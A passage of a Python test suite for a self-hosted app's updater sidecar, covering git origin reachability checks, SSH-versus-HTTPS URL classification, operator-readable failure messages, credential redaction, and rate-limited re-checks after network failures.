    _git("-C", str(repo), "remote", "add", "origin", str(url))
    return repo


def test_remote_check_passes_against_a_reachable_origin(tmp_path, monkeypatch, git_env):
    import updater.supervisor as sup
    repo = _clone_with_origin(tmp_path, _bare_origin(tmp_path))
    monkeypatch.setattr(sup, "ROOT", str(repo))
    assert sup._remote_check() == "ok"


def test_remote_check_fails_readably_when_origin_is_unreachable(tmp_path, monkeypatch, git_env):
    """A failure must publish something an operator can act on.

    The reason goes straight into /control/updater.json and is rendered in the
    admin panel, so "returned non-zero exit status 128" — which is all
    `check=True` plus `f"FAIL: {e}"` would have produced — is not good enough.
    git's own stderr has to survive into the message.
    """
    import updater.supervisor as sup
    repo = _clone_with_origin(tmp_path, tmp_path / "definitely-not-here.git")
    monkeypatch.setattr(sup, "ROOT", str(repo))
    result = sup._remote_check()
    assert result.startswith("FAIL: ")
    assert "definitely-not-here.git" in result
    # git's own words, not just an exit code.
    assert "git said:" in result
    assert "exit status" not in result


def test_remote_check_reports_a_missing_repo_without_crashing(tmp_path, monkeypatch, git_env):
    """ROOT not being a git repository at all is a mounting mistake, not a
    reason for the supervisor to die — the loop calls this on a timer."""
    import updater.supervisor as sup
    monkeypatch.setattr(sup, "ROOT", str(tmp_path))
    assert sup._remote_check().startswith("FAIL: ")


# ── The classifier behind the message ────────────────────────────────────────

@pytest.mark.parametrize("url", [
    "git@example.org:team/repo.git",                  # scp-style
    "ssh://git@example.net/team/repo.git",            # explicit scheme
    "git+ssh://git@example.com/repo.git",
    "user@host.example:path/repo.git",
    f"git@{REWRITTEN_SSH_HOST}:OWNER/REPO.git",       # the rewritten host too
    f"ssh://git@{REWRITTEN_SSH_HOST}/OWNER/REPO.git",
])
def test_ssh_urls_are_recognised(url):
    assert looks_like_ssh_url(url) is True


@pytest.mark.parametrize("url", [
    f"https://{REWRITTEN_SSH_HOST}/OWNER/REPO.git",
    "http://example.com/repo.git",
    "file:///srv/mirror.git",
    "/opt/vigilant",                 # a local path origin, used by the tests above
    "../mirror.git",
    "",
    None,
])
def test_non_ssh_urls_are_not_mistaken_for_ssh(url):
    assert looks_like_ssh_url(url) is False


def test_scp_style_url_is_recognised_without_the_string_ssh():
    """The spelling that actually broke production contains no scheme and no
    "ssh" anywhere, and urlparse reads it as a scheme-less path. A colon before
    the first slash is the only thing that distinguishes it."""
    url = "git@example.org:team/repo.git"
    assert "ssh" not in url
    assert looks_like_ssh_url(url) is True


@pytest.mark.parametrize("url,host", [
    ("git@example.org:team/repo.git", "example.org"),
    ("ssh://git@example.net/team/repo.git", "example.net"),
    ("https://someone:s3cret@example.com/me/repo.git", "example.com"),
    ("https://EXAMPLE.ORG/a/b.git", "example.org"),          # case-folded
    (f"git@{REWRITTEN_SSH_HOST}:OWNER/REPO.git", REWRITTEN_SSH_HOST),
    ("/srv/vigilant", ""),
])
def test_url_host_extraction(url, host):
    assert url_host(url) == host


def test_reason_for_an_unrewritable_ssh_origin_names_the_fix():
    reason = remote_failure_reason(
        "git@example.org:team/repo.git",
        "fatal: unable to fork\nerror: cannot run ssh: No such file or directory\n")
    assert "no SSH client" in reason
    assert "https://" in reason
    assert "not supported" in reason
    # The escape hatch has to be named, or the message reads as "you are stuck".
    assert "scripts/deploy.sh" in reason


def test_reason_for_a_rewritable_ssh_origin_blames_the_environment():
    """If an origin on the rewritten host is STILL ssh after rewriting, the
    operator's origin is fine and the image's GIT_CONFIG_* variables are
    missing — telling them to change their origin sends them to fix the wrong
    thing."""
    reason = remote_failure_reason(
        f"git@{REWRITTEN_SSH_HOST}:OWNER/REPO.git",
        "error: cannot run ssh: No such file or directory\n")
    assert "GIT_CONFIG" in reason
    assert "not supported" not in reason


def test_reason_for_an_authenticated_origin_says_credentials():
    reason = remote_failure_reason(
        "https://example.com/OWNER/PRIVATE.git",
        "fatal: could not read Username for 'https://example.com': "
        "terminal prompts disabled\n")
    assert "requires credentials" in reason
    assert "private repository" in reason.lower()


def test_reason_for_a_network_failure_is_generic_but_carries_stderr():
    reason = remote_failure_reason(
        "https://example.com/OWNER/REPO.git",
        "fatal: unable to access '...': Could not resolve host: example.com\n")
    assert "could not reach origin" in reason
    assert "Could not resolve host" in reason


# ── Credentials must never reach the published reason ────────────────────────

def test_userinfo_is_stripped_from_the_url_in_the_reason():
    """A self-hoster who cloned with a token in the origin URL must not have it
    republished into /control/updater.json and an admin page."""
    reason = remote_failure_reason(
        "https://someone:s3cret@example.com/o/r.git", "boom")
    assert "s3cret" not in reason
    assert "***@example.com" in reason


def test_userinfo_is_stripped_from_git_stderr_too():
    """Redacting only the URL is the easy half-fix: git echoes the remote URL
    back inside its own error text, so the secret arrives by the other door."""
    reason = remote_failure_reason(
        "https://example.com/o/r.git",
        "fatal: unable to access "
        "'https://someone:s3cret@example.com/o/r.git/': 403\n")
    assert "s3cret" not in reason
    assert "***@example.com" in reason


def test_redaction_leaves_scp_style_urls_intact():
    """An scp-style remote has no `://` and its "userinfo" is a well-known
    service account name, not a secret. Blanking it would erase the clearest
    clue on the failure path this whole check exists for."""
    assert redact_userinfo("git@example.org:o/r.git") == "git@example.org:o/r.git"


# ── Rate-limited re-evaluation of a FAILING remote check ─────────────────────
#
# The other self-checks run once at startup and that is correct for them. This
# one depends on DNS and outbound network, and a sidecar that loses the race
# after a host reboot would otherwise keep the Update button disabled — with a
# transient network error as the stated reason — until someone SSHed in to
# restart the container, which is the thing this feature exists to avoid.

@pytest.mark.parametrize("result", ["ok", None])
def test_a_passing_or_absent_remote_check_is_never_rerun(result):
    checks = {"socket": "ok"}
    if result is not None:
        checks["remote"] = result
    assert should_recheck_remote(checks, last_checked=0.0, now=10 ** 9) is False


def test_a_failing_remote_check_is_rerun_only_after_the_interval():
    checks = {"remote": "FAIL: nope"}
    assert should_recheck_remote(checks, last_checked=1000.0, now=1001.0) is False
    assert should_recheck_remote(checks, last_checked=1000.0,
                                 now=1000.0 + _REMOTE_RECHECK_SECONDS) is True


def test_the_interval_is_measured_from_the_attempt_not_the_failure():
    """A check that keeps timing out must not accumulate back-to-back runs."""
    checks = {"remote": "FAIL: timed out"}
    assert should_recheck_remote(checks, last_checked=5000.0, now=5100.0) is False


def test_remote_check_recovers_without_a_restart(tmp_path, monkeypatch, git_env):
    """The whole point, exercised against real git rather than a stub.

    Starts with an origin that does not exist (the check fails), then repairs
    origin and advances the clock past the interval. The published `checks` dict
    must flip to "ok" in place, with the one-shot checks left untouched.
    """
    import updater.supervisor as sup
    repo = _clone_with_origin(tmp_path, tmp_path / "not-yet.git")
    monkeypatch.setattr(sup, "ROOT", str(repo))

    checks = {"socket": "ok", "git": "ok", "compose": "ok",
              "remote": sup._remote_check(), "deployed": "ok"}
    assert checks["remote"].startswith("FAIL: ")

    # Origin becomes reachable — the reboot-race case, where the network arrives
    # a moment after the sidecar did.
    _git("-C", str(repo), "remote", "set-url", "origin", str(_bare_origin(tmp_path)))

    # Still inside the rate limit: nothing is re-run, so the value must not move
    # even though the underlying problem is already fixed.
    unchanged = sup.refresh_remote_check(checks, last_checked=1000.0, now=1001.0)
    assert unchanged == 1000.0
    assert checks["remote"].startswith("FAIL: ")

    # Past the interval: re-evaluated in place, and the timestamp advances.
    now = 1000.0 + _REMOTE_RECHECK_SECONDS
    assert sup.refresh_remote_check(checks, last_checked=1000.0, now=now) == now
    assert checks["remote"] == "ok"
    # The one-shot checks are NOT re-run: rebuilding the dict via _self_checks()
    # would put a `docker version` and a `docker compose config` on a timer
    # forever to recover from a network blip.
    assert [k for k in checks] == ["socket", "git", "compose", "remote", "deployed"]
    assert checks["socket"] == "ok" and checks["compose"] == "ok"


def test_a_recovered_remote_check_is_not_rerun_again(tmp_path, monkeypatch, git_env):
    import updater.supervisor as sup
    monkeypatch.setattr(sup, "ROOT", str(tmp_path))     # would FAIL if re-run
    checks = {"remote": "ok"}
    assert sup.refresh_remote_check(checks, last_checked=0.0, now=10 ** 9) == 0.0
    assert checks["remote"] == "ok"


# ── The image's git configuration must survive into deploy.sh ────────────────

def test_deploy_subprocess_inherits_the_images_git_environment(tmp_path, monkeypatch):
    """The fix is an ENV in updater/Dockerfile, which only works because
    run_action() spawns deploy.sh with `env={**os.environ, ...}`.

    Scrubbing that environment down to an explicit allowlist is a plausible
    future hardening change, and it would silently reintroduce the original
    bug — deploy.sh's `git fetch` would go back to exec'ing an ssh client that
    does not exist in this image. This runs a real deploy.sh stand-in and reads
    the variables back out of its output.
    """
    import updater.supervisor as sup
    monkeypatch.setattr(sup, "CONTROL", tmp_path)
    monkeypatch.setattr(sup, "ROOT", str(tmp_path))
    monkeypatch.setenv("GIT_CONFIG_COUNT", "2")
    monkeypatch.setenv("GIT_CONFIG_KEY_0", "url.https://github.com/.insteadOf")
    monkeypatch.setenv("GIT_CONFIG_VALUE_0", "git@example.org:")

    scripts = tmp_path / "scripts"
    scripts.mkdir()
    deploy = scripts / "deploy.sh"
    deploy.write_text(
        "#!/usr/bin/env bash\n"
        'echo "COUNT=${GIT_CONFIG_COUNT:-unset}"\n'
        'echo "KEY0=${GIT_CONFIG_KEY_0:-unset}"\n'
        'echo "VALUE0=${GIT_CONFIG_VALUE_0:-unset}"\n'
    )
    deploy.chmod(0o755)

    sup.run_action({"id": "r1", "action": "update", "tag": "v9.9.9"})
    status = json.loads((tmp_path / "status.json").read_text())
    log = "\n".join(status["log_tail"])
    assert "COUNT=2" in log
    assert "KEY0=url.https://github.com/.insteadOf" in log
    assert "VALUE0=git@example.org:" in log
